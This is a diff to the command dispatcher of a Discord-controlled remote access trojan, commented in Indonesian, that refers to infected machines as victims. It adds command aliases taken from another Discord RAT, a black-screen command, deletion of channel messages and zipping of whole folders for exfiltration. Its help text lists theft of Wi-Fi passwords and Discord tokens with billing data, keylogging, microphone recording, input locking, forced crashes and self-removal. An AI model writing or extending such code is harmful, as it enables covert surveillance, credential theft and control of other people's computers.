@@ -9,11 +9,44 @@ Output selalu diprefix [alias] supaya lu bisa bedain korban.
 """
 
 import os
+import shutil
 import tempfile
 import threading
 import time
 
 from . import caps, extra, persist, update
+
+# Nama perintah dari README truelockmc/Discord-RAT, dipetakan ke verb di sini.
+# Tujuannya supaya perintah yang sudah kebiasa dipakai tetap jalan apa adanya,
+# tanpa harus menghafal nama baru.
+_FIXED = {
+    "screenshot": ("shot", ""),
+    "cmd": ("sh", ""),
+    "shell": ("sh", ""),
+    "file_upload": ("up", ""),
+    "file_download": ("dl", ""),
+    "execute": ("x", ""),
+    "restart": ("power", "reboot"),
+    "shutdown": ("power", "shutdown"),
+    "system_info": ("sys", ""),
+    "keylog": ("keys", ""),
+    "rickroll": ("rick", ""),
+    "grab_discord": ("grab", ""),
+    "stop": ("exit", ""),
+    "uninstall": ("nuke", ""),
+}
+
+
+def _canon(verb, arg):
+    """Terjemahkan nama perintah repo ke verb di sini."""
+    if verb == "input":
+        return "block", "off" if arg.strip().lower() in ("unblock", "off", "0", "no") else "on"
+    fixed = _FIXED.get(verb)
+    if not fixed:
+        return verb, arg
+    target, pre = fixed
+    return target, ((pre + " " + arg).strip() if pre else arg)
+
 
 HELP = """verb yang ada:
 info                 ringkasan mesin
@@ -40,8 +73,9 @@ volume up|down|mute|0-100
 mic [detik]          rekam mikrofon -> attachment WAV
 block on|off         kunci keyboard+mouse (butuh admin)
 rick [url]           layar penuh, rick off untuk tutup
+blackscreen [off]    layar hitam + kursor hilang
 wifi                 semua profil wifi + password
-grab                 token Discord (tanpa admin, lewat DPAPI)
+grab                 token Discord hidup + email, billing, kontak
 power reboot|shutdown|logoff
 admin                minta UAC, instance baru elevated
 bsod yes             bugcheck (mesin restart)
@@ -53,7 +87,12 @@ update gh <owner>/<repo> [aset] [sha256]
                      ambil aset rilis terbaru dari repo GitHub, lalu sama
 sleep <detik>        jeda polling
 exit                 mati (autostart tetap)
-purge                hapus diri total"""
+purge [n]            hapus pesan bot di channel (default 100)
+uninstall            hapus diri total
+
+nama dari README Discord-RAT juga jalan:
+screenshot cmd file_upload file_download execute restart shutdown
+system_info keylog input rickroll grab_discord stop"""
 
 
 class Dispatcher:
@@ -84,6 +123,7 @@ class Dispatcher:
         verb, _, arg = body.partition(" ")
         verb = verb.lower().strip()
         arg = arg.strip()
+        verb, arg = _canon(verb, arg)
 
         if verb in ("help", "?"):
             return self.bot.send("alias mesin ini: !%s   (!* = semua mesin)\n%s"
@@ -136,6 +176,9 @@ class Dispatcher:
             if arg.strip().lower() in ("off", "stop", "close"):
                 return self.bot.send(extra.rick_off())
             return self.bot.send(extra.rick(arg.strip() or None))
+        if verb == "blackscreen":
+            return self.bot.send(extra.blackscreen(
+                arg.strip().lower() not in ("off", "0", "no", "stop")))
         if verb == "wifi":
             return self.bot.send(extra.wifi())
         if verb == "grab":
@@ -161,6 +204,8 @@ class Dispatcher:
                 return self.bot.send("[err] angka")
             return self.bot.send("polling %ss" % self.state["sleep"])
         if verb == "purge":
+            return self._purge(arg)
+        if verb == "nuke":
             self.bot.send(persist.purge(self.name))
             time.sleep(1)
             os._exit(0)
@@ -220,19 +265,52 @@ class Dispatcher:
             except OSError:
                 pass
 
+    def _purge(self, arg):
+        """Hapus pesan di channel, mundur dari yang terbaru.
+
+        Pesan bot sendiri selalu bisa; pesan user butuh izin Manage Messages.
+        Yang ditolak dilaporkan sebagai angka, bukan disembunyikan.
+        """
+        try:
+            limit = max(1, min(int(arg), 200))
+        except (TypeError, ValueError):
+            limit = 100
+
+        def run():
+            try:
+                gone, skip = self.bot.purge(limit)
+                self.bot.send("purge: %d dihapus, %d ditolak (perlu Manage Messages)"
+                              % (gone, skip))
+            except Exception as exc:
+                self.bot.send("[err] purge: %s" % exc)
+
+        threading.Thread(target=run, daemon=True).start()
+        return self.bot.send("purge %d pesan..." % limit)
+
     def _download(self, path):
         if not path:
             return self.bot.send("[err] butuh path")
         full = os.path.abspath(os.path.join(self.shell.cwd, os.path.expanduser(path)))
-        if not os.path.isfile(full):
-            return self.bot.send("[err] tidak ada: %s" % full)
-        size = os.path.getsize(full)
-        if size > 24 * 1024 * 1024:
-            return self.bot.send("[err] %d MB, di atas limit upload" % (size / 2 ** 20))
+        zipped = None
         try:
+            # Folder ikut: di-zip dulu ke %TEMP%, lalu dihapus lagi setelah terkirim.
+            if os.path.isdir(full):
+                base = os.path.join(tempfile.gettempdir(), "dir_%d" % int(time.time()))
+                full, zipped = shutil.make_archive(base, "zip", full), True
+            if not os.path.isfile(full):
+                return self.bot.send("[err] tidak ada: %s" % full)
+            size = os.path.getsize(full)
+            if size > 24 * 1024 * 1024:
+                return self.bot.send("[err] %d MB, di atas limit upload" % (size / 2 ** 20))
             self.bot.send_file(full, "%s (%d B)" % (os.path.basename(full), size))
         except Exception as exc:
             self.bot.send("[err] %s" % exc)
+        finally:
+            if zipped:
+                try:
+                    os.remove(full)
+                except OSError:
+                    pass
 
     def _upload(self, path, attachments):
         if not attachments:
